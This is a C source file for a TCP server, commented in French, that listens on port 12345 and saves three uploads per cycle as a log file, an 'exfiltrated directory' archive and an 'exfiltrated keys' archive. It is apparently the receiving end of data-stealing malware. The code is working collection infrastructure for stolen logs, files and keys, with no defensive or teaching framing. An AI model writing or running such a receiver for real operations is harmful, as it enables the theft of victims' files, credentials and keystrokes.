#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define SERVER_PORT 12345
#define BUFFER_SIZE 1024

void save_received_file(int sockfd, const char* filename) {
    printf("Attente de réception: %s\n", filename);

    char buffer[BUFFER_SIZE];
    FILE* file = fopen(filename, "wb");
    if (!file) {
        perror("Erreur lors de l'ouverture du fichier");
        return;
    }

    ssize_t bytes_received;
    while ((bytes_received = recv(sockfd, buffer, BUFFER_SIZE, 0)) > 0) {
        fwrite(buffer, 1, bytes_received, file);
    }

    if (bytes_received < 0) {
        perror("Erreur lors de la réception du fichier");
    } else {
        printf("%s reçu et sauvegardé.\n", filename);
    }

    fclose(file);
}

int main() {
    int server_fd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("Erreur lors de la création du socket");
        exit(EXIT_FAILURE);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Erreur lors du bind");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 5) < 0) {
        perror("Erreur lors de l'écoute");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("Serveur en écoute sur le port %d\n", SERVER_PORT);

    while (1) {
        client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_addr_len);
        if (client_fd < 0) {
            perror("Erreur lors de l'acceptation de la connexion client");
            continue;
        }

        printf("Client connecté : %s\n", inet_ntoa(client_addr.sin_addr));

        save_received_file(client_fd, "log.txt"); // Correction ici pour log.txt
        printf("log.txt reçu et sauvegardé.\n");
        close(client_fd); //  fermer la connexion après chaque fichier reçu.

        client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_addr_len);
        if (client_fd >= 0) {
            printf("Client connecté pour le deuxième fichier.\n");
            save_received_file(client_fd, "Répertoire_exfiltré.zip");
            printf("Répertoire_exfiltré.zip reçu et sauvegardé.\n");
            close(client_fd);
        }

        client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_addr_len);
        if (client_fd >= 0) {
            printf("Client connecté pour le troisième fichier.\n");
            save_received_file(client_fd, "Clés_exfiltré.zip");
            printf("Clés_exfiltré.zip reçu et sauvegardé.\n");
            close(client_fd);
        }
    }

    close(server_fd);
    return 0;
}
